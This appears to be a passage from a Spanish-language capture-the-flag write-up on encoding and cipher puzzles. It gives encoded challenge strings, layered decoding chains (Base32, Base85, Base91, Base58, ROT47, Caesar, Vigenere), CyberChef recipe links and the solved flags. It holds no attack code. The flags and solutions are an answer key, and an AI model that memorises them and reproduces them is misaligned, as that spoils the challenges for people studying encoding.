zNUVEdJVVQ2UUJTR0VWRUNSWlJGTTdHVzNUVEdGRFZLS0JSR0JFR0FNUlVGTTdGU1lUUkdJVVQ2UUJVR0ZRU0VVWlFGTTdHVzRMVUdOQkM2TEozR0VWRUNSWlFGTTdUV1FKSEdGRFZLS0JSR0JTQ01QUk9GTTdGU1lUUkdJVVRNT1JUR0pCRlFaSlNGTTdHVzIzU0dJVVNJTFJQR0VWRUNSWlJGTTdUV1FKSEdGRFZLS0JSR0ZDVllUSlhGTTdGU1lUUkdJVVZDVEJXR0pCRlFaSlNGTTdHVzVEVkdCU1dFUEpKR0ZEVktLQlJHRlFTRVdKV0ZNN0ZTWVRSR0lVVDZRQlVHSkJGUVpKU0ZNN0dXMkRSR0JTV0VQSkpHRkRWS0tCUkdFVkVDVVpaRk03RlNZVFJHSVVUTU9SWEdKT1hHM1JURk03R1c1RFZHTkJDNkxKM0dFVkVDUlpTRk03VFdSWkpHRkRWS0tCUkdJVFQyWVJWRk03RlNZVFJHSVVUNlFCUUdCRkU2WEJMR0VWRUNSWlBGTTdHVzJEUkdGRFZLS0JSR0lUVDIzUjRGTTdGU1lUUkdJVVMyTkJTR0VWRUNRSk9GTTdHWUlaQkdGUlZVV1pYR0VWRUNSWlRGTTdHWUpSQ0dGRFZLS0JSR0ZRU0VUSk1HRVZFQ1FKT0ZNN0dXNURWR0JTV0VPUklHRkRWS0tCUkdFVkVDVVpaRk03RlNZVFJHSVVTSUxSUkdCU0NNT0JORk03R1c1RFZHSVVWVVVSVkdFVkVDUlpTRk03R1lJWkJHRkRWS0tCUkdCRUdBTkpRRk03RlNZVFJHSVVUNlFCWUdNU0RVSVJVRk03R1c1RFZHTkJDNkxKM0dFVkVDUlpRRk03RU9VSklGTTdGU1lUUkdJVVMyTkJXR0pPWEczUlRGTTdHVzJEUkdGUlZVV1pYR0VWRUNSWlBGTTdHWUtKREdGRFZLS0JSR0ZRU0VXSlJGTTdGU1lUUkdJVVNJTFJSR0pCRlFaSlNGTTdHVzIzU0dJVVVRUlJUR0VWRUNSWlJGTTdHVzIzU0dGRFZLS0JSR0ZRU0VXSlJGTTdGU1lUUkdJVVMyTkJTR0JFR0FMWk1GTTdHVzRMVUdJVVQ2UUJTR0VWRUNSWlJGTTdFT1VKS0ZNN0ZTWVRSR0lVUzJOQlJHTTdWS0taVkZNN0dXMkRSR0lVV0dXQldHRVZFQ1JaVEZNN0dXNExVR0ZEVktLQlJHQkVHQVFKWkZNN0ZTWVRSR0lVVkNUQlZHTVNEVUlSVUZNN0dXMkRSR0lVV0dXQldHRVZFQ1JaUEZNN0dXNExVR0ZEVktLQlJHQkVHQVFKWkZNN0ZTWVRSR0lVVE1PUlRHRkNWWVNSUEZNN0dXMjNTR0ZSVlVXWlhHRVZFQ1JaUEZNN0dZSlJDR0ZEVktLQlJHQkVHQU5KVEZNN0ZTWVRSR0lVVDZRQlVHQlNDTU9CTkZNN0dXMkRSR0JTV0VQSkpHRkRWS0tCUkdJVFQyWVJURk03RlNZVFJHSVVVUVJSVkdFVkVDUUpPRk03R1cyM1NHSVVTMk5CUUdFVkVDUlpURk03R1lLSkRHRkRWS0tCUkdCU0NNU1JaRk03RlNZVFJHSVVUNlFCVUdCRUdBTFpNRk03R1c0TFVHSVVUTU9SUkdFVkVDUlpTRk03R1cyM1NHRkRWS0tCUkdGQ1ZZVUJQRk03RlNZVFJHSVVTMk5CUkdNN1ZLS1pWRk03R1cyRFJHQlNXRVFCS0dGRFZLS0JSR0JTQ01NUkpHQkVHQUxaTUZNN0dXM1RUR0lVVDZRQlNHRVZFQ1JaU0ZNN0dXNURWR0ZEVktLQlJHRkNWWVVCUEZNN0ZTWVRSR0lVVVFSUlpHTVNEVUlSVUZNN0dXMkRSR0lVV0dXQldHRVZFQ1JaUUZNN0VPVUpJRk03RlNZVFJHSVVTMk5CT0dCRkVNVlJLR0VWRUNSWlRGTTdHVzJEUkdGRFZLS0JSR0JTQ01QUlVGTTdGU1lUUkdJVVQ2UUJRR0JGRU1WUktHRVZFQ1JaUEZNN0dHSlJER0ZEVktLQlJHRkNWWVhCM0ZNN0ZTWVRSR0lVUzJOQlNHSkJGUVpKU0ZNN0dXNURWR05CQzZMSjNHRVZFQ1JaT0ZNN0dXNURWR0ZEVktLQlJHSVRUMlZSTkdCRUdBTFpNRk03R1c1RFZHTkJDTUpaMkdFVkVDUlpSRk03R0dLSkVHRkRWS0tCUkdGQ1ZZVUJTRk03RlNZVFJHSVVUNlFCVEdNN1ZLS1pWRk03R1cyRFJHTkJEUU1aNEdFVkVDUlpSRk03R0dLSkVHRkRWS0tCUkdGUVNFV0pXRk03RlNZVFJHSVVUTU9SUEdCRkZRWVJNR0VWRUNSWlRGTTdHWUtKREdGRFZLS0JSR0JTQ01QUlNGTTdGU1lUUkdJVVVRUlJVR01TRFVJUlVGTTdHVzVEVkdJVVNJTFJQR0VWRUNSWk9GTTdHVzRMVUdGRFZLS0JSR0lUVDJZUllGTTdGU1lUUkdJVVRNT1JTR01TRFVJUlVGTTdHWUlaQkdCU1dFUEpKR0ZEVktLQlJHRkNWWVVCV0ZNN0ZTWVRSR0lVVDZRQlVHQkVHQUxaTUZNN0dXNURWR0JTV0VRQktHRkRWS0tCUkdGQ1ZZVUJVRk03RlNZVFJHSVVTSUxSVkdNN1ZLS1pWRk03R1lJWkJHRlJWQ1ZKV0dFVkVDUlpTRk03R1c0TFVHRkRWS0tCUkdCRUdBTkpNRk03RlNZVFJHSVVTMk5CT0dCRkU2WEJMR0VWRUNSWlBGTTdHWUlaQkdGRFZLS0JSR0ZRU0VXSlNGTTdGU1lUUkdJVVNJTFJSR0JFR0FMWk1GTTdHVzNUVEdOQkRRTVo0R0VWRUNSWlBGTTdHR0pSREdGRFZLS0JSR0VWRUNSQlZGTTdGU1lUUkdJVVVRUlJSR0JGRlFZUk1HRVZFQ1JaUEZNN0dZSVpCR0ZEVktLQlJHQkVHQU5KTkZNN0ZTWVRSR0lVVVFSUlZHRkNWWVNSUEZNN0dXNExVR05CQ01KWjJHRVZFQ1JaU0ZNN0VPVUpLRk03RlNZVFJHSVVTMk5CU0dGQ1ZZU1JQRk03R1czVFRHSVVWQ1RCVUdFVkVDUlpURk03VFdSWkpHRkRWS0tCUkdCU0NNT1pVRk03RlNZVFJHSVVUTU9SVEdGUVNFVVpRRk03R1czVFRHSVVWVVVSVkdFVkVDUlpTRk03RU9VSkpGTTdGU1lUUkdJVVMyTkJTR0ZRU0VVWlFGTTdHVzRMVUdOQkM2TEozR0VWRUNSWlBGTTdFT1VKSUZNN0ZTWVRSR0lVVDZRQlVHSVRUMlhCUkZNN0dXMjNTR0lVV0dXQldHRVZFQ1JaUkZNN0dXM1RUR0ZEVktLQlJHSVRUMlhaWUZNN0ZTWVRSR0lVVkNUQjJHTTdWS0taVkZNN0dXNURWR0lVUzJOQlFHRVZFQ1JaVEZNN1RXUlpKR0ZEVktLQlJHQlNDTU9aVUZNN0ZTWVRSR0lVVE1PUlRHRlFTRVVaUUZNN0dXMjNTR0lVUzJOQlFHRVZFQ1JaUkZNN0VPVUpKRk03RlNZVFJHSVVVUVJSVkdFVkVDUUpPRk03R1lJWkJHRlJWQ1ZKV0dFVkVDUlpSRk03R1cyRFJHRkRWS0tCUkdGQ1ZZUkJMR0JTQ01PQk5GTTdHVzJEUkdJVVMyTkJRR0VWRUNSWlRGTTdFT1VKSkZNN0ZTWVRSR0lVVE1PUlRHRkNWWVNSUEZNN0dZSVpCR0lVU0lMUlBHRVZFQ1JaU0ZNN0dHS0pFR0ZEVktLQlJHRVZFQ09aS0dFVkVDUUpPRk03R1czVFRHQlNXRU9SSUdGRFZLS0JSR0JFR0FOSlNGTTdGU1lUUkdJVVRNT1JUR0ZRU0VVWlFGTTdHVzIzU0dGUlZDVkpXR0VWRUNSWlBGTTdHVzNUVEdGRFZLS0JSR0lUVDJZUlVGTTdGU1lUUkdJVVMyTkJTR0ZRU0VVWlFGTTdHVzVEVkdJVVZDVEJVR0VWRUNSWlFGTTdFT1VKSUZNN0ZTWVRSR0lVVDZRQlVHRlFTRVVaUUZNN0dXNURWR0lVVVFSUlRHRVZFQ1JaUkZNN0VPVUpLRk03RlNZVFJHSVVUNlFCVEdNU0RVSVJVRk03R1c0TFVHSVVWQ1RCVUdFVkVDUlpTRk03R1cyM1NHRkRWS0tCUkdFVkVDUlpSRk03RlNZVFJHSVVTSUxSUkdCU0NNT0JORk03R1c1RFZHSVVUTU9SUkdFVkVDUlpRRk03R1lKUkNHRkRWS0tCUkdGUVNFWkozRk03RlNZVFJHSVVVUVJSVUdNU0RVSVJVRk03R1czVFRHRlJWQ1ZKV0dFVkVDUlpRRk03R1lJWkJHRkRWS0tCUkdJVFQyWVJURk03RlNZVFJHSVVTSUxSUUdNN1ZLS1pWRk03R1czVFRHSVVWVVVSVkdFVkVDUlpRRk03VFdRSkhHRkRWS0tCUkdFVkVDT1pLR0JTQ01PQk5GTTdHVzIzU0dJVVZVVVJWR0VWRUNSWlRGTTdHWUlaQkdGRFZLS0JSR0ZRU0VUSk1HRVZFQ1FKT0ZNN0dXMkRSR0lVVVFSUlRHRVZFQ1JaVEZNN0dXM1RUR0ZEVktLQlJHRVZFQ1JaUEZNN0ZTWVRSR0lVUzJOQldHTVNEVUlSVUZNN0dXNExVR0lVVVFSUlRHRVZFQ1JaUEZNN0dHSlJER0ZEVktLQlJHSVRUMllSVEZNN0ZTWVRSR0lVVVFSUlVHTVNEVUlSVUZNN0dXNURWR05CQ01KWjJHRVZFQ1JaUEZNN0dXNExVR0ZEVktLQlJHQlNDTVNSMkZNN0ZTWVRSR0lVVE1PUlhHTTdWS0taVkZNN0dXNURWR0lVVkNUQlVHRVZFQ1JaVEZNN0dXNURWR0ZEVktLQlJHRVZFQ1JaT0ZNN0ZTWVRSR0lVVkNUQldHQkVHQUxaTUZNN0dXM1RUR0lVVDZRQlNHRVZFQ1JaT0ZNN0dXMjNTR0ZEVktLQlJHQlNDTU1SSkdCRUdBTFpNRk03R1czVFRHSVVWVVVSVkdFVkVDUlpSRk03R1czVFRHRkRWS0tCUkdGQ1ZZWEIzRk03RlNZVFJHSVVWQ1RCV0dJVFQyWEJSRk03R1c1RFZHSVVUNlFCU0dFVkVDUlpSRk03RU9VSklGTTdGU1lUUkdJVVMyTkJTR0pCRlFaSlNGTTdHVzRMVUdOQkNNSloyR0VWRUNSWlRGTTdHWUlaQkdGRFZLS0JSR0JTQ01QUk5GTTdGU1lUUkdJVVRNT1JQR0JGRTZYQkxHRVZFQ1JaU0ZNN1RXUUpIR0ZEVktLQlJHRlFTRVpKNEZNN0ZTWVRSR0lVVVFSUlZHSkJGUVpKU0ZNN0dZSVpCR0lVVkNUQlVHRVZFQ1JaUEZNN0VPVUpLRk03RlNZVFJHSVVTMk5CUkdNU0RVSVJVRk03R1c1RFZHRlJWVVdaWEdFVkVDUlpTRk03RU9VSktGTTdGU1lUUkdJVVRNT1JYR0pPWEczUlRGTTdHVzRMVUdOQkM2TEozR0VWRUNSWlJGTTdUV1JCSUdGRFZLS0JSR0VWRUNVWlpGTTdGU1lUUkdJVVZDVEJXR0ZRU0VVWlFGTTdHVzNUVEdJVVZVVVJWR0VWRUNSWlNGTTdHVzIzU0dGRFZLS0JSR0lUVDJZUlZGTTdGU1lUUkdJVVRNT1JUR0ZDVllTUlBGTTdHVzRMVUdJVVMyTkJRR0VWRUNSWlNGTTdUV1JaSkdGRFZLS0JSR0VWRUNSWlRGTTdGU1lUUkdJVVQ2UUJUR003VktLWlZGTTdHVzIzU0dJVVNJTFJQR0VWRUNSWk9GTTdHVzRMVUdGRFZLS0JSR0ZRU0VaSjRGTTdGU1lUUkdJVVZDVEJXR0ZRU0VVWlFGTTdHVzJEUkdJVVMyTkJRR0VWRUNSWlRGTTdHR0tKRUdGRFZLS0JSR0ZDVllVQlNGTTdGU1lUUkdJVVZDVEJWR003VktLWlZGTTdHVzVEVkdOQkNNSloyR0VWRUNSWlJGTTdHWUtKREdGRFZLS0JSR0JFR0FRSlpGTTdGU1lUUkdJVVRNT1JUR0lUVDJYQlJGTTdHVzRMVUdJVVdHV0JXR0VWRUNSWk9GTTdUV1JaSkdGRFZLS0JSR0lUVDJZUlRGTTdGU1lUUkdJVVQ2UUJZR0pPWEczUlRGTTdHWUlaQkdOQkNNSloyR0VWRUNSWlNGTTdHVzVEVkdGRFZLS0JSR0JFR0FLSklHRVZFQ1FKT0ZNN0dXNExVR0lVVkNUQlVHRVZFQ1JaUEZNN1RXUUpIR0ZEVktLQlJHQlNDTU9aVkZNN0ZTWVRSR0lVVDZRQlVHRVZFQ1FKT0ZNN0dXMjNTR0JTV0VPUklHRkRWS0tCUkdGUVNFV0pWRk03RlNZVFJHSVVVUVJSVkdJVFQyWEJSRk03R1lJWkJHSVVVUVJSVEdFVkVDUlpTRk03VFdRSkhHRkRWS0tCUkdGUVNFWko1Rk03RlNZVFJHSVVUNlFCUUdCRkZRWVJNR0VWRUNSWlRGTTdHVzNUVEdGRFZLS0JSR0JTQ01QUlFGTTdGU1lUUkdJVVRNT1JUR0lUVDJYQlJGTTdHVzVEVkdOQkRRTVo0R0VWRUNSWlNGTTdFT1VKS0ZNN0ZTWVRSR0lVUzJOQldHTVNEVUlSVUZNN0dXNURWR0lVVE1PUlJHRVZFQ1JaUUZNN0dXNExVR0ZEVktLQlJHRVZFQ09aS0dCU0NNT0JORk03R1cyM1NHSVVUNlFCU0dFVkVDUlpQRk03R1lJWkJHRkRWS0tCUkdCRUdBUUpZRk03RlNZVFJHSVVUTU9SUEdCRkU2WEJMR0VWRUNSWk9GTTdUV1JCSUdGRFZLS0JSR0ZDVllVQldGTTdGU1lUUkdJVVMyTkJXR0pPWEczUlRGTTdHVzIzU0dJVVRNT1JSR0VWRUNSWlFGTTdHVzJEUkdGRFZLS0JSR0JTQ01NUkpHQlNDTU9CTkZNN0dXM1RUR0ZSVlVXWlhHRVZFQ1JaVEZNN0dXNExVR0ZEVktLQlJHQlNDTVBSUUZNN0ZTWVRSR0lVVVFSUlpHSk9YRzNSVEZNN0dXM1RUR0lVU0lMUlBHRVZFQ1JaUEZNN0dXNExVR0ZEVktLQlJHRVZFQ1JaUEZNN0ZTWVRSR0lVVVFSUlpHTTdWS0taVkZNN0dZSVpCR0lVVVFSUlRHRVZFQ1JaT0ZNN1RXUkJJR0ZEVktLQlJHRkNWWVVCUkZNN0ZTWVRSR0lVVVFSUlZHSk9YRzNSVEZNN0dXNURWR0lVVkNUQlVHRVZFQ1JaUUZNN0VPVUpJRk03RlNZVFJHSVVVUVJSUkdCRkVNVlJLR0VWRUNSWlFGTTdHVzRMVUdGRFZLS0JSR0JTQ01NUkpHQlNDTU9CTkZNN0dXMjNTR05CRFFNWjRHRVZFQ1JaUkZNN1RXUkJJR0ZEVktLQlJHSVRUMjNSNEZNN0ZTWVRSR0lVUzJOQldHTTdWS0taVkZNN0dXM1RUR0JTV0VRQktHRkRWS0tCUkdCRUdBTkpURk03RlNZVFJHSVVTMk5CUkdNN1ZLS1pWRk03R1c0TFVHQlNXRVBKSkdGRFZLS0JSR0VWRUNSWlBGTTdGU1lUUkdJVVNJTFJWR003VktLWlZGTTdHVzVEVkdCU1dFT1JJR0ZEVktLQlJHRkNWWVVCV0ZNN0ZTWVRSR0lVVkNUQldHQkVHQUxaTUZNN0dXM1RUR0lVVVFSUlRHRVZFQ1JaUUZNN1RXUkJJR0ZEVktLQlJHQlNDTVBST0ZNN0ZTWVRSR0lVVDZRQlFHQkZFTVZSS0dFVkVDUlpSRk03VFdRSkhHRkRWS0tCUkdGUVNFV0pTRk03RlNZVFJHSVVTSUxSVkdNU0RVSVJVRk03R1cyM1NHSVVVUVJSVEdFVkVDUlpPRk03RU9VSktGTTdGU1lUUkdJVVMyTkJTR0VWRUNRSk9GTTdHVzIzU0dCU1dFT1JJR0ZEVktLQlJHRlFTRVpKNEZNN0ZTWVRSR0lVVDZRQlVHQlNDTU9CTkZNN0dXNExVR0lVVDZRQlNHRVZFQ1JaUEZNN0dZS0pER0ZEVktLQlJHRlFTRVdKUkZNN0ZTWVRSR0lVVDZRQlVHQkVHQUxaTUZNN0dZSVpCR05CQ01KWjJHRVZFQ1JaU0ZNN1RXUkJJR0ZEVktLQlJHQlNDTVBSVUZNN0ZTWVRSR0lVVVFSUlVHTTdWS0taVkZNN0dXM1RUR0lVUzJOQlFHRVZFQ1JaT0ZNN0dHS0pFR0ZEVktLQlJHQlNDTU9aVkZNN0ZTWVRSR0lVVkNUQldHSVRUMlhCUkZNN0dXMkRSR0lVVVFSUlRHRVZFQ1JaU0ZNN0dXMjNTR0ZEVktLQlJHRlFTRVdKUUZNN0ZTWVRSR0lVVVFSUlZHRkNWWVNSUEZNN0dXNURWR05CQzZMSjNHRVZFQ1JaT0ZNN0VPVUpKRk03RlNZVFJHSVVUTU9SVEdFVkVDUUpPRk03R1cyM1NHQlNXRVBKSkdGRFZLS0JSR0ZRU0VXSlVGTTdGU1lUUkdJVVVRUlJSR0JGRlFZUk1HRVZFQ1JaUkZNN0VPVUpJRk03RlNZVFJHSVVUTU9SU0dNNkE9PT09 2- Base91\naE8aZL9YYk4vQt1Zd7yaxV77wCZNkkD9DhEiAnujqBWRzyYphzsb6PVBZtCNPg9K4Sxctp2dvV76p1Qho73sLDqXvhFkNYQ4ovG5GdcWrR1wqTUCsNXBQTkpxE16j9KKqbGoSvajW4pZds8Rm2cLvuAwHxBw9BLafyUYP6NKZ9v8khk3zMvDQGDkdac3EHUy11BDEBDLM3uMNJBvqUKCprznqvBz8WhtstapDVE3CamkyBNRY4d7i92jgp4mefw8ntHEcin4kUH8CXZJHLUZGytcbGPNPatrsGPCS5L7mfRrqMPbVY21CTDmQs7qesrELzuhh7bDHqh7nk1SAqFcQj37c55PxejBMf5efP2Ju7kf1YwCu7Ac9VFVUtYQrm32UEkWihj5i2HASAZaAJ1ZWBWLwyUBJav8HH7FwCA3NzqVd5vsmTbGNk3Fb2EqeG5G1Xhn7ZQAH3RfmcnzA98RT4wgqEN7jVHhiJdZa5pgyS8bCNC56tXpn9sfrqpNhoT3mX87heTmn6p5t4BecT85PRgezBmwHgCbU5GPunkisbPtnP1PxmkWgYZ5o2c9MyyQG9osEy8JrSyZQpE5DHyHMWQnKLKAQLawq5uKjZJNQEcpmqHKRDApPfJF4VjQPiVShy9qcuFXEsApUGJ2oFkH5TziVYxsmeZSb5yg1qYJ9jN8XE4T3GBh64Jkt6YUvDFPGJh2moZW5TjSpKt9M5Jdj9qF2twkAUFDSZDNadD2Hm9iT6fBHnaortu4ENchFs91JFNWhP1MomRgYaj9u 3- Base58 \u0026gt; Base16 \u0026gt; Base64 \u0026gt; Base10 \u0026gt; Base16\nhttps://gchq.github.io/CyberChef/#recipe=From_Base58(\u0026#39;123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz\u0026#39;,false)From_Hex(\u0026#39;Space\u0026#39;)From_Base64(\u0026#39;A-Za-z0-9%2B/%3D\u0026#39;,true)From_Decimal(\u0026#39;Space\u0026#39;,false)From_Hex(\u0026#39;Space\u0026#39;)\u0026amp;input=YUU4YVpMOVlZazR2UXQxWmQ3eWF4Vjc3d0NaTmtrRDlEaEVpQW51anFCV1J6eVlwaHpzYjZQVkJadENOUGc5SzRTeGN0cDJkdlY3NnAxUWhvNzNzTERxWHZoRmtOWVE0b3ZHNUdkY1dyUjF3cVRVQ3NOWEJRVGtweEUxNmo5S0txYkdvU3Zhalc0cFpkczhSbTJjTHZ1QXdIeEJ3OUJMYWZ5VVlQNk5LWjl2OGtoazN6TXZEUUdEa2RhYzNFSFV5MTFCREVCRExNM3VNTkpCdnFVS0NwcnpucXZCejhXaHRzdGFwRFZFM0NhbWt5Qk5SWTRkN2k5MmpncDRtZWZ3OG50SEVjaW40a1VIOENYWkpITFVaR3l0Y2JHUE5QYXRyc0dQQ1M1TDdtZlJycU1QYlZZMjFDVERtUXM3cWVzckVMenVoaDdiREhxaDduazFTQXFGY1FqMzdjNTVQeGVqQk1mNWVmUDJKdTdrZjFZd0N1N0FjOVZGVlV0WVFybTMyVUVrV2loajVpMkhBU0FaYUFKMVpXQldMd3lVQkphdjhISDdGd0NBM056cVZkNXZzbVRiR05rM0ZiMkVxZUc1RzFYaG43WlFBSDNSZm1jbnpBOThSVDR3Z3FFTjdqVkhoaUpkWmE1cGd5UzhiQ05DNTZ0WHBuOXNmcnFwTmhvVDNtWDg3aGVUbW42cDV0NEJlY1Q4NVBSZ2V6Qm13SGdDYlU1R1B1bmtpc2JQdG5QMVB4bWtXZ1laNW8yYzlNeXlRRzlvc0V5OEpyU3laUXBFNURIeUhNV1FuS0xLQVFMYXdxNXVLalpKTlFFY3BtcUhLUkRBcFBmSkY0VmpRUGlWU2h5OXFjdUZYRXNBcFVHSjJvRmtINVR6aVZZeHNtZVpTYjV5ZzFxWUo5ak44WEU0VDNHQmg2NEprdDZZVXZERlBHSmgybW9aVzVUalNwS3Q5TTVKZGo5cUYydHdrQVVGRFNaRE5hZEQySG05aVQ2ZkJIbmFvcnR1NEVOY2hGczkxSkZOV2hQMU1vbVJnWWFqOXU { Fase 02 - Base, Cipher } #1[Easy] Reto\nPJXHQ4S7GEZV6ZTDOZQQ==== Solucion\nBase32 \u0026gt; Caesar Cipher (Shift 13) \u0026gt; \u0026quot;make_13_spin\u0026quot;\n1- Base32\nznxr_13_fcva 2- Caesar Cipher (shift 13)\nmake_13_spin #2 [Moderate] Reto\nNjZMKVhATl1EcEI2Jio4Q0xuVy1EZSo5ZkFLV0M6QVUtPFpGQ0InIkReYg== Solucion\nBase64 \u0026gt; Base85 \u0026gt; Vigenere Decode (key: tango)\n[Solucion - CyberChef]\nhttps://gchq.github.io/CyberChef/#recipe=From_Base64(\u0026#39;A-Za-z0-9%2B/%3D\u0026#39;,true)From_Base85(\u0026#39;!-u\u0026#39;)Vigen%C3%A8re_Decode(\u0026#39;tango\u0026#39;)\u0026amp;input=TmpaTUtWaEFUbDFFY0VJMkppbzRRMHh1VnkxRVpTbzVaa0ZMVjBNNlFWVXRQRnBHUTBJbklrUmVZZz09 #3 [Hard] Reto\n-!r/X,]n/Z-Zs\\X,X$,rI\u0026lt;@]#-9Oh,-=A]R-p9\\+ Solucion\nBase85 \u0026gt; Rot47 \u0026gt; Base64 \u0026gt; Base32 \u0026gt; Caesar cipher ( shift 13) \u0026gt; qrpbqr_naq_ebg 1- Base85 \u0026gt; Rot47 \u0026gt; Base64 \u0026gt; Base32 (CyberChef)\nhttps://gchq.github.io/CyberChef/#recipe=From_Base85(\u0026#39;!-u\u0026#39;)ROT47(47)From_Base64(\u0026#39;A-Za-z0-9%2B/%3D\u0026#39;,true)From_Base32(\u0026#39;A-Z2-7%3D\u0026#39;,true)\u0026amp;input=LSFyL1gsXW4vWi1ac1xYLFgkLHJJPEBdIy05T2gsLT1BXVItcDlcKw 2- Caesar Cipher (shift 13)\nqrpbqr_naq_ebg #4 [Insane] Reto - Pastebin\nPastebin\nyou are a real code cracker\nSolucion\nBase32 \u0026gt; Base85 \u0026gt; Base91 \u0026gt; Base10 \u0026gt; Base16 \u0026gt; Base64 \u0026gt; Base58 \u0026gt; Vigenere Cipher 1- Base32 \u0026gt; Base85 (CyberChef)\nhttps://gchq.github.io/CyberChef/#recipe=From_Base32(\u0026#39;A-Z2-7%3D\u0026#39;,true)From_Base85(\u0026#39;!-u\u0026#39;)\u0026amp;input=R1pYU01QS1hINFJHRTRUS0dRU1ZLWVMzSEpFVUNYRE1HSlBEQVhDU0lFMlNHUVNJSUZJV1FSSlpHQlVVR0tKSkZVNFQyNERKSUZJU1FTWlNGWTRWS01LVUdaWFNJMkRMSFJSVFNYTEtHUVNWS1lTM0hVU0c0TEpRR0ZDVzRPQ09JRTJTSVpUQUdRU1NDSkxGR0JVVUdLSkpGVTRUNEozTkZOT1VHTTJCRlk0VktNS1VHWlhTTVBLWEg0UkdFNFRLR1FTVktZUzNITlFWTVhSTUdFVkZHTDJOSUUyU0lJS01JRklXT1FUUkdCVVVHS0pKRlU0VDRKM05JTVhXTVNKR0ZZNFZLTUtVR1pYU01QS1hGVVJUS05KVkdRU1ZLWVMzSE5RVk1YUk1HRlFUSVFLUElFMlNHUVNJSUZJV1FSSlpHQlVVR0tKSkZVNFQyNERKSUZJU1FUUlRGWTRWS01LVUdaWFNNUEtYRlVSVEtOSlZHUVNWS1lTM0hOUVZNWFJNR0ZDVzRPQ09JRTJTR0xLRElGSVdRWTJGR0JVVUdLSkpGVTRUNFhSS0ZOT1VHS1I2Rlk0VktNS1VHUk5DSVgyU0g0UkdFNFRLR1FTVktZUzNIVVNHNExKUUdCU0RRSlNNSUUyU0dRU0lJRklXU1FLUkdCVVVHS0pKRlU0VDRVUkdGTk9VR00yQkZZNFZLTUtVR1pYU0kzQ0tJUVhUVTRKSkdRU1ZLWVMzSUEzU1VSUzZHRlFUSVFLUElFMlNJWlRBSUZJV1FSSlpHQlVVR0tKSkZVNFQ0WFJLRk5PVUdNMkJGWTRWS01LVUdSTkNHTkxHSFJSVFNYTEtHUVNWS1lTM0hVU0c0TEpRR0ZRVElRS1BJRTJTR0xLRElGSVdTVTJaR0JVVUdLSkpGVTRUMjRESklGSVNRU1pTRlk0VktNS1VIUkVTNk5aTkg0UkdFNFRLR1FTVktZUzNIVVNHNExKUUdGUVRJUUtQSUUyU0dMS0RHUkNXQVpSSEdCVVVHS0pKRlU0VDRKM05GTk9VR0tSNkZZNFZLTUtVSFJFUzJZMk9IUlJUU1hMS0dRU1ZLWVMzSEpFVUNYRE1HSlBEQVhDU0lFMlNJSUtNSUZJV09RVFJHQlVVR0tKSkZVNFQ0SjNORk5PVUtYQlNGWTRWS01LVUhSRVMyWTJPSFJSVFNYTEtHUVNWS1lTM0lBM1NVUlM2R0ZDVzRPQ09JRTJTSUlLTUlGSVdRUkpaR0JVVUdLSkpGVTRUMjRESkZOT1VLWEJTRlk0VktNS1VHWlhTSTJETEhSUlRTWExLR1FTVktZUzNJRkhVQzJUQ0dGQ1c0T0NPSUUyU0lJS01HUkNXRVVTWUdCVVVHS0pKRlU0VDI0REpJRklTUVRSVEZZNFZLTUtVR1JOQ0lYMlNJQllXMlgzU0dRU1ZLWVMzSFVTRzRMSlFKQTNFNlpLQUlFMlNJSUtNR1FTU0NKTEZHQlVVR0tKSkZVNFQ0VVJHSU1YV01TSkdGWTRWS01LVUdSTkNHTkxHSFJSVFNYTEtHUVNWS1lTM0hKRVQ2T1JJSTVZRElYQjdJRTJTR1FTSUlGSVdPUVRSR0JVVUdLSkpGVTRUMjRESkZOT1VHS1I2Rlk0VktNS1VIUkVTNk5aTkg0UkdFNFRLR1FTVktZUzNJQTNTU01SMkdJVFU2U1NRSUUyU0lJS01JRklXU1FLUkdCVVVHS0pKRlU0VDI0REpJRklTUVNaU0ZZNFZLTUtVR1pYU01QS1hHUVVVUVhLTkdRU1ZLWVMzSFVTRzRMSlFHRkNXNE9DT0lFMlNJWlRBSUZJV1FSSlpHQlVVR0tKSkZVNFQ0VVJHR1paRlVLTElGWTRWS01LVUdSTkNJWDJTSDRSR0U0VEtHUVNWS1lTM0hKRVQ2T1JJSTVZRElYQjdJRTJTR1FTSUlGSVdTUUtSR0JVVUdLSkpGVTRUNFhSS0ZOT1VHTEo3Rlk0VktNS1VHUk5DSVgyU0lCWVcyWDNTR1FTVktZUzNISkVUNk9SSUk1WURJWEI3SUUyU0laVEFJRklXU1UyWkdCVVVHS0pKRlU0VDRYUktJRklTUVJLUA 2- Base91\n53 50 32 51 49 32 53 53 32 51 48 32 53 49 32 53 55 32 51 49 32 52 56 32 53 50 32 52 54 32 52 54 32 52 70 32 53 54 32 52 56 32 53 53 32 51 49 32 53 54 32 52 55 32 54 56 32 55 53 32 54 50 32 53 53 32 53 50 32 54 56 32 53 65 32 54 66 32 51 53 32 55 56 32 54 49 32 53 56 32 54 52 32 51 48 32 52 70 32 53 56 32 54 67 32 52 53 32 52 69 32 51 49 32 52 54 32 52 51 32 52 69 32 54 65 32 52 53 32 51 51 32 53 49 32 55 65 32 52 65 32 51 49 32 54 52 32 53 51 32 52 49 32 54 70 32 54 49 32 51 50 32 53 54 32 51 53 32 52 70 32 54 57 32 52 50 32 51 48 32 53 57 32 53 55 32 51 53 32 54 69 32 54 50 32 51 50 32 53 50 32 55 54 32 54 52 32 51 50 32 51 52 32 55 48 3- Base10 \u0026gt; Base16 \u0026gt; Base64 \u0026gt; Base58 - (CyberChef)\nhttps://gchq.github.io/CyberChef/#recipe=From_Decimal(\u0026#39;Space\u0026#39;,false)From_Hex(\u0026#39;Space\u0026#39;)From_Base64(\u0026#39;A-Za-z0-9%2B/%3D\u0026#39;,true)\u0026amp;input=NTMgNTAgMzIgNTEgNDkgMzIgNTMgNTMgMzIgNTEgNDggMzIgNTMgNDkgMzIgNTMgNTUgMzIgNTEgNDkgMzIgNTIgNTYgMzIgNTMgNTAgMzIgNTIgNTQgMzIgNTIgNTQgMzIgNTIgNzAgMzIgNTMgNTQgMzIgNTIgNTYgMzIgNTMgNTMgMzIgNTEgNDkgMzIgNTMgNTQgMzIgNTIgNTUgMzIgNTQgNTYgMzIgNTUgNTMgMzIgNTQgNTAgMzIgNTMgNTMgMzIgNTMgNTAgMzIgNTQgNTYgMzIgNTMgNjUgMzIgNTQgNjYgMzIgNTEgNTMgMzIgNTUgNTYgMzIgNTQgNDkgMzIgNTMgNTYgMzIgNTQgNTIgMzIgNTEgNDggMzIgNTIgNzAgMzIgNTMgNTYgMzIgNTQgNjcgMzIgNTIgNTMgMzIgNTIgNjkgMzIgNTEgNDkgMzIgNTIgNTQgMzIgNTIgNTEgMzIgNTIgNjkgMzI